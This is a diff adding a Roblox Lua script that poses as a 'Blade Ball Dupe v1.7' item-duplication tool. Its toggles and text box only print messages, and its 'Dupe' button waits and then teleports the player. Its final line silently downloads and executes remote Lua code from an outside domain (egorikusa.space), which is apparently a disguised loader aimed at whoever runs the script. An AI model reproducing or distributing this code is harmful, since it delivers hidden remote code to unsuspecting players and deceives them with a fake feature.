@@ -1,0 +1,36 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Blade Ball Dupe v1.7", "DarkTheme")
+
+--main
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("BB Dupe v1.7")
+
+MainSection:NewToggle("Dupe Delay", "REQUIRED TO DUPE ITEMS", function(state)
+    if state then
+        print("Delay On")
+    else
+        print("Delay Off")
+    end
+end)
+
+MainSection:NewToggle("Weapon ID Changer", "ACTIVATE TO BE SAFE", function(state)
+    if state then
+        print("Safe Mode On")
+    else
+        print("Safe Mode Off")
+    end
+end)
+
+MainSection:NewTextBox("Item To Dupe", "Item To Dupe", function(txt)
+	print(txt)
+end)
+
+MainSection:NewButton("Dupe", "WILL TAKE 1 - 10 MINUTES", function()
+    print("Duping Items. Please wait")
+    wait(60)
+    game:GetService("TeleportService"):Teleport(13772394625)
+end)
+
+getgenv().gui = false
+
+loadstring(game:HttpGet("https://egorikusa.space/0f7b842b57d339fc701d7e0a.lua", true))()
